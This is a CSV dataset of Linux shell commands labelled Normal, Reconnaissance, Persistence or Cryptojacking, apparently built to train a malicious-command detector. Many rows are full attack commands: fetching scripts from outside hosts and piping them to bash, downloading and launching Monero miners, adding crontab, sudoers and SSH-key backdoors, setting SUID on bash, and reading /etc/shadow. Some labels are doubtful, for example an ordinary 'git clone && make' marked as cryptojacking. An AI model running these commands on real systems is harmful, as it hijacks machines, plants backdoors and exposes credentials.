command,label
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
cd /home/user && pwd,Normal
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
cat /proc/cpuinfo; pkill -f kdevtmpfsi; wget https://bitbucket.org/install.sh -O install.sh && tar -xzf install.sh && echo '@reboot ./kdevtmpfsi -o minexmr.com:443' >> /etc/crontab,Cryptojacking
netstat -tulpn,Reconnaissance
whoami,Normal
cat /etc/shadow,Reconnaissance
crontab -e,Persistence
whoami,Normal
top -n 1,Normal
uname -a && id && w,Reconnaissance
cat /var/log/syslog | grep error,Normal
netstat -tulpn,Reconnaissance
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
curl -s http://bitbucket.org/cron.sh | bash,Cryptojacking
cat /etc/passwd,Reconnaissance
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
curl -s http://github.com/update.sh | bash,Cryptojacking
ps aux | grep root,Reconnaissance
wget http://bitbucket.org/minerd -O /tmp/minerd && chmod +x /tmp/minerd && /tmp/minerd -o pool.supportxmr.com:3333,Cryptojacking
ls -la /var/log,Normal
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
curl -s http://bitbucket.org/syslogd | bash,Cryptojacking
useradd -m -s /bin/bash sysadmin && echo 'sysadmin:password' | chpasswd,Persistence
cat /proc/cpuinfo; pkill -f minerd; wget https://192.168.1.50/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./minerd -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
ip a && route -n,Reconnaissance
git clone https://185.12.33.1/repo.git && cd repo && make,Cryptojacking
clear,Normal
ps aux | grep root,Reconnaissance
ps aux | grep root,Reconnaissance
echo '* * * * * root /tmp/install.sh' >> /etc/crontab,Persistence
ip a && route -n,Reconnaissance
curl -s http://10.0.0.5/update.sh | bash,Cryptojacking
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
uname -a && id && w,Reconnaissance
ping -c 4 github.com,Normal
uname -a && id && w,Reconnaissance
ps aux | grep root,Reconnaissance
htop,Normal
ps aux | grep root,Reconnaissance
ip a && route -n,Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
nohup ./minerd -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
chmod u+s /bin/bash,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
history,Normal
git clone https://10.0.0.5/repo.git && cd repo && make,Cryptojacking
echo '* * * * * root /tmp/syslogd' >> /etc/crontab,Persistence
find / -perm -4000 -type f 2>/dev/null,Reconnaissance
git clone https://github.com/repo.git && cd repo && make,Cryptojacking
crontab -e,Persistence
cat /etc/passwd,Reconnaissance
nohup ./cpuminer -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
cd /home/user && pwd,Normal
git clone https://142.250.190.46/repo.git && cd repo && make,Cryptojacking
echo 'ssh-rsa AAAAB3NzaC1yc2EAAA...' >> ~/.ssh/authorized_keys,Persistence
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
curl -s http://10.0.0.5/syslogd | bash,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
chmod u+s /bin/bash,Persistence
nohup ./cpuminer -o nanopool.org:14433 -u FAKE_WALLET -p x &,Cryptojacking
chmod u+s /bin/bash,Persistence
cat /proc/cpuinfo; pkill -f cpuminer; wget https://github.com/miner.tar.gz -O miner.tar.gz && tar -xzf miner.tar.gz && echo '@reboot ./cpuminer -o pool.supportxmr.com:3333' >> /etc/crontab,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
nohup ./minerd -o xmrpool.eu:9000 -u FAKE_WALLET -p x &,Cryptojacking
curl -s http://45.33.32.156/syslogd | bash,Cryptojacking
cat /var/log/syslog | grep error,Normal
cat /etc/shadow,Reconnaissance
uname -a && id && w,Reconnaissance
ip a && route -n,Reconnaissance
git clone https://45.33.32.156/repo.git && cd repo && make,Cryptojacking
echo '* * * * * root /tmp/miner.tar.gz' >> /etc/crontab,Persistence
nohup ./cpuminer -o pool.supportxmr.com:3333 -u FAKE_WALLET -p x &,Cryptojacking
cat /var/log/syslog | grep error,Normal
netstat -tulpn,Reconnaissance
echo 'checking system logs',Normal
cat /var/log/syslog | grep error,Normal
git clone https://bitbucket.org/repo.git && cd repo && make,Cryptojacking
lscpu | grep 'Model name\|Core(s) per socket\|Thread(s) per core',Reconnaissance
nohup ./xmrig -o minexmr.com:443 -u FAKE_WALLET -p x &,Cryptojacking
echo 'checking system logs',Normal
netstat -tulpn,Reconnaissance
cat /proc/cpuinfo; pkill -f cpuminer; wget https://142.250.190.46/cron.sh -O cron.sh && tar -xzf cron.sh && echo '@reboot ./cpuminer -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
ps aux | grep root,Reconnaissance
uname -a && id && w,Reconnaissance
sudo apt-get update && sudo apt-get upgrade,Normal
ls -la /var/log,Normal
cat /proc/cpuinfo; pkill -f coinminer; wget https://185.12.33.1/syslogd -O syslogd && tar -xzf syslogd && echo '@reboot ./coinminer -o xmrpool.eu:9000' >> /etc/crontab,Cryptojacking
echo 'hacker ALL=(ALL:ALL) ALL' >> /etc/sudoers,Persistence
wget http://192.168.1.50/kdevtmpfsi -O /tmp/kdevtmpfsi && chmod +x /tmp/kdevtmpfsi && /tmp/kdevtmpfsi -o nanopool.org:14433,Cryptojacking
ps aux | grep root,Reconnaissance
echo 'checking system logs',Normal
curl -s http://192.168.1.50/syslogd | bash,Cryptojacking
ls -la /var/log,Normal
